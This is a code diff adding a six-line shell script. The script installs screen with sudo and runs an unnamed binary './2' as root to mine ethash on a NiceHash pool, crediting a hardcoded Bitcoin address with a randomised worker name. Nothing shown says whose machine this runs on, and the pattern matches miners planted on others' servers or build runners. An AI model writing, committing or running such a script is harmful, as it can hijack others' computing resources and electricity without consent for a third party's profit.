@@ -1,0 +1,6 @@
+#!/bin/sh
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
+sudo apt-get update
+sudo apt install screen -y
+sudo ./2 -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 377cWsho6HMyCdoijLzw8J2gRKqf9CzLjW.$WORKER
